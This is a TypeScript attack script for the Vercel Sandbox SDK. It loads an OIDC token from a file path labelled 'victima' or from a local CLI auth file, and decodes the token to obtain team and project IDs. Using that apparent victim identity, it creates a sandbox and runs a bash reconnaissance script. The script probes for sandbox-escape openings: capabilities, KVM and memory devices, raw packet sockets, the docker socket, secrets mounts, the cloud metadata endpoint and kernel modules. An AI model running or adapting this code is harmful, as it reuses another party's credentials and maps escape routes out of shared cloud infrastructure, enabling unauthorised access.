import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "recon-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const SCRIPT = `
set +e
echo "===== CAPS ====="
capsh --print 2>/dev/null | head -6
grep CapEff /proc/self/status
echo "===== /dev devices ====="
ls -la /dev/ 2>/dev/null
echo "===== writable char devices? ====="
find /dev -maxdepth 2 -type c 2>/dev/null
echo "===== VSOCK / hypervisor ====="
ls -la /dev/vsock /dev/vhost-net /dev/net/tun /dev/kvm /dev/mem /dev/kmem 2>&1
echo "===== MOUNTS ====="
mount 2>/dev/null | head -30
echo "===== /proc/net/routes ====="
cat /proc/net/route 2>/dev/null
echo "===== ARP ====="
ip neigh 2>/dev/null
echo "===== AF_PACKET test ====="
timeout 2 python3 -c "import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3)); print('AF_PACKET OK')" 2>&1
echo "===== KVM test ====="
timeout 2 python3 -c "
try:
  fd=open('/dev/kvm','rb'); print('KVM device OPEN OK'); fd.close()
except Exception as e: print('KVM:', e)
" 2>&1
echo "===== CGROUP ====="
ls /sys/fs/cgroup/ 2>/dev/null | head -5
cat /proc/self/cgroup 2>/dev/null | head -5
echo "===== docker socket / host paths ====="
ls -la /var/run/docker.sock /run/docker.sock /.dockerenv 2>&1
ls -la /host /mnt /var/run/secrets 2>&1 | head -12
echo "===== AWS metadata reachable? ====="
timeout 3 curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>&1 | head -3
timeout 3 curl -s --max-time 2 http://169.254.169.254/ 2>&1 | head -3
echo "===== dmesg tail (recent boot msgs) ====="
dmesg 2>/dev/null | tail -25
echo "===== kernel modules ====="
ls /sys/module/ 2>/dev/null | head -40
echo "===== ip link ====="
ip link 2>/dev/null
echo "===== DONE ====="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 60_000 });
  console.log(await r.output("both"));
  console.log("NAME=" + (sbx as any).name);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });